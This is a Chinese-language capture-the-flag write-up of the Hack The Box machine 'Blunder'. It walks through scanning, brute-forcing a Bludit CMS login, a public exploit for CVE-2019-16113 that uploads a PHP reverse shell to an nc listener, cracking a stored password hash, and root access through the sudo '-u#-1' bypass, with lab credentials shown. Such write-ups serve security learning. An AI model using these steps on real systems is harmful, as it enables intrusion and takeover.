# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
```
┌──(root💀kali)-[~/htb/Blunder]
└─# nmap -sV -Pn 10.10.10.191 -p-  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-21 01:34 EST
Nmap scan report for 10.10.10.191
Host is up (0.30s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.09 seconds

```

21端口已经被关闭了，只有80端口一个方向，先爆破看看。

## 爆破目录
```
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.191                                     

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.191/_21-12-21_01-37-07.txt

Error Log: /root/dirsearch/logs/errors-21-12-21_01-37-07.log

Target: http://10.10.10.191/

[01:37:09] Starting: 
[01:37:21] 200 -    7KB - /%3f/                                            
[01:37:25] 400 -  304B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[01:37:45] 200 -  955B  - /.github/                                        
[01:37:46] 200 -  563B  - /.gitignore                                                                                
[01:38:28] 200 -    7KB - /0                                               
[01:38:55] 200 -    1KB - /LICENSE                                          
[01:39:00] 200 -    3KB - /README.md                                        
[01:39:59] 200 -    3KB - /about                                            
[01:40:23] 301 -    0B  - /admin  ->  http://10.10.10.191/admin/            
[01:40:32] 200 -    2KB - /admin/                                                                             
[01:43:38] 400 -  304B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[01:45:44] 200 -   30B  - /install.php                                      
[01:48:07] 200 -   22B  - /robots.txt                                       
[01:48:16] 403 -  277B  - /server-status/                                   
[01:48:16] 403 -  277B  - /server-status                                    
[01:49:19] 200 -  118B  - /todo.txt  
```

通常我会再用gobuster再爆破一次
```
└─# gobuster dir -w /usr/share/wordlists/Web-Content/common.txt -u http://10.10.10.191 -t 30 --no-error 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.191
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/21 01:51:39 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.git/logs/           (Status: 301) [Size: 0] [--> http://10.10.10.191/.git/logs]
/.htaccess            (Status: 403) [Size: 277]                                  
/.gitignore           (Status: 200) [Size: 563]                                  
/.hta                 (Status: 403) [Size: 277]                                  
/0                    (Status: 200) [Size: 7562]                                 
/LICENSE              (Status: 200) [Size: 1083]                                 
/about                (Status: 200) [Size: 3281]                                 
/admin                (Status: 301) [Size: 0] [--> http://10.10.10.191/admin/]   
/cgi-bin/             (Status: 301) [Size: 0] [--> http://10.10.10.191/cgi-bin]  
/robots.txt           (Status: 200) [Size: 22]                                   
/server-status        (Status: 403) [Size: 277]                                  
                                                                                 
===============================================================
2021/12/21 01:53:33 Finished
===============================================================

```

结合两次爆破结果一一查看我们感兴趣的文件和目录

README.md
```
ludit](https://www.bludit.com/)
================================
**Simple**, **Fast** and **Flexible** CMS.

Bludit is a web application to build your own **website** or **blog** in seconds, it's completely **free and open source**. Bludit uses files in JSON format to store the content, you don't need to install or configure a database. You only need a web server with PHP support.

Bludit is a **Flat-File** CMS.

Bludit supports **Markdown** and **HTML code** for the content.

- [Plugins](https://plugins.bludit.com)
- [Themes](https://themes.bludit.com)
- [Documentation](https://docs.bludit.com)
- Help and Support [Forum](https://forum.bludit.org) and [Chat](https://gitter.im/bludit/support)

```
得到cms名称：```Bludit```


todo.txt
```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

ftp确认是被作者关闭了。cms升级没有完成，暗示有漏洞，```fergus```可能是一个用户名。


搜索这个cms的利用代码
```
┌──(root💀kali)-[~/htb/Blunder]
└─# searchsploit Bludit
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass                                                                                                                                               | php/webapps/48746.rb
Bludit - Directory Traversal Image File Upload (Metasploit)                                                                                                                                               | php/remote/47699.rb
Bludit 3.9.12 - Directory Traversal                                                                                                                                                                       | php/webapps/48568.py
Bludit 3.9.2 - Auth Bruteforce Bypass                                                                                                                                                                     | php/webapps/48942.py
Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                                                                                                                                              | php/webapps/49037.rb
Bludit 3.9.2 - Directory Traversal                                                                                                                                                                        | multiple/webapps/48701.txt
bludit Pages Editor 3.0.0 - Arbitrary File Upload                                                                                                                                                         | php/webapps/46060.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

存在一个暴力枚举漏洞，把48942.py复制到本地，将fergus保存到user.txt

```
┌──(root💀kali)-[~/htb/Blunder]
└─# python3 48942.py -l http://10.10.10.191/admin/login.php -u ./user.txt -p /usr/share/wordlists/SecLists/Passwords/2020-200_most_used_passwords.txt
[*] Bludit Auth BF Mitigation Bypass Script by ColdFusionX 
     
[◣] Brute Force: Testing -> fergus:123456
[┘] Brute Force: Testing -> fergus:123456789
[../.....] Brute Force: Testing -> fergus:picture1
[.] Brute Force: Testing -> fergus:password
[b] Brute Force: Testing -> fergus:12345678
[←] Brute Force: Testing -> fergus:111111
[┬] Brute Force: Testing -> fergus:123123
[▖] Brute Force: Testing -> fergus:12345
[◓] Brute Force: Testing -> fergus:1234567890
[↙] Brute Force: Testing -> fergus:senha
[o] Brute Force: Testing -> fergus:1234567
[└] Brute Force: Testing -> fergus:qwerty
[o] Brute Force: Testing -> fergus:abc123
[┬] Brute Force: Testing -> fergus:Million2
[├] Brute Force: Testing -> fergus:000000
[ ] Brute Force: Testing -> fergus:1234
[▁] Brute Force: Testing -> fergus:iloveyou
[◑] Brute Force: Testing -> fergus:aaron431
[\] Brute Force: Testing -> fergus:password1
[┘] Brute Force: Testing -> fergus:qqww1122
[↙] Brute Force: Testing -> fergus:123
[p] Brute Force: Testing -> fergus:omgpop
[◣] Brute Force: Testing -> fergus:123321
[..\.....] Brute Force: Testing -> fergus:654321
[-] Brute Force: Testing -> fergus:qwertyuiop
[▆] Brute Force: Testing -> fergus:qwer123456
[∧] Brute Force: Testing -> fergus:123456a
[o] Brute Force: Testing -> fergus:a123456
[◤] Brute Force: Testing -> fergus:666666
[◣] Brute Force: Testing -> fergus:asdfghjkl
[/] Brute Force: Testing -> fergus:ashley
[▗] Brute Force: Testing -> fergus:987654321
[▘] Brute Force: Testing -> fergus:RolandDeschain

[*] SUCCESS !!
[+] Use Credential -> fergus:RolandDeschain

```

拿到cms登录凭证：```fergus:RolandDeschain```

# 初始shell
根据搜索的漏洞信息，这个cms还存在一个上传漏洞，但是kali上的payload需要用到msf，我们并不想用这个工具

从msf里这个exp的版本号```CVE-2019-16113```,在github上找到了[这个poc](https://github.com/hamedkohi/CVE-2019-16113/blob/main/poc.py)

根据poc的利用步骤，先把```RolandDeschain```保存在pass文件

开启一个监听
> nc -lnvp 4242

执行poc

```
┌──(root💀kali)-[~/htb/Blunder]
└─# python3 poc.py

     _____      _    ______  _____  _____
    |  __ \    | |   | ___ \/  __ \|  ___|
    | |  \/ ___| |_  | |_/ /| /  \/| |__
    | | __ / _ \ __| |    / | |    |  __|
    | |_\ \  __/ |_ _| |\ \ | \__/\| |___
     \____/\___|\__(_)_| \_| \____/\____/
    This exploit combines CVE-2019-17240 & CVE-2019-16113 to gain remote shell on target.
    Created by: kisho64 (@h_a_m_i__)
    
Enter target URL (i.e. https://target.com): http://10.10.10.191
[ ~ ] Enter listener's IP: 10.10.14.3
[ ~ ] Enter listener's port: 4242
[...] Checking if the target is live...
[ + ] The target is live! We are good to go...

[ ~ ] Should I bruteforce username? [Y/N]: N
[ ~ ] What username should I use? (leave this to use admin as username): fergus
[ ~ ] Enter the location for password list: /root/htb/Blunder/pass

[ * ] Tried: RolandDeschain
[ + ] Creds found: fergus:RolandDeschain

[...] Attempting to login now...
[ + ] Login succeed... We are good to go :)

[ + ] The payload mYTcGvAwRD.php has been uploaded...
[ + ] The payload .htaccess has been uploaded...

[...] Attempting to get a shell... @ http://10.10.10.191/bl-content/tmp/mYTcGvAwRD.php
[ + ] You should be getting a shell by now, if not open http://10.10.10.191/bl-content/tmp/mYTcGvAwRD.php

```


拿到初始shell
```
┌──(root💀kali)-[~/htb/Blunder]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.191] 46044
bash: cannot set terminal process group (1279): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ 

```
## 提权到hugo
user.txt在hugo用户下，我们没有权限查看

在文件```/var/www/bludit-3.10.0a/bl-content/databases/users.php```找到hugo的md5密码：```faca404fd5c0a31cf1897b823c695c85cffeb98d```
```
www-data@blunder:/var/www/bludit-3.9.2/bl-kernel/admin/controllers$ cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
<r/www/bludit-3.10.0a/bl-content/databases/users.php                
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}

```

[这里](https://www.somd5.com/)解出来以后是：```Password120```

提权到hugo的账号：
```
www-data@blunder:/var/www/bludit-3.9.2/bl-kernel/admin/controllers$ su hugo
su hugo
Password: Password120
id
uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
whoami
hugo
```
# 提权

查看hugo特权信息

```
hugo@blunder:/var/www/bludit-3.9.2/bl-kernel/admin/controllers$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash

```

可以直接提权到root

```
hugo@blunder:/var/www/bludit-3.9.2/bl-kernel/admin/controllers$ sudo -u#-1 /bin/bash
<2/bl-kernel/admin/controllers$ sudo -u#-1 /bin/bash            
root@blunder:/var/www/bludit-3.9.2/bl-kernel/admin/controllers# id
id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
root@blunder:/var/www/bludit-3.9.2/bl-kernel/admin/controllers# whoami
whoami
root

```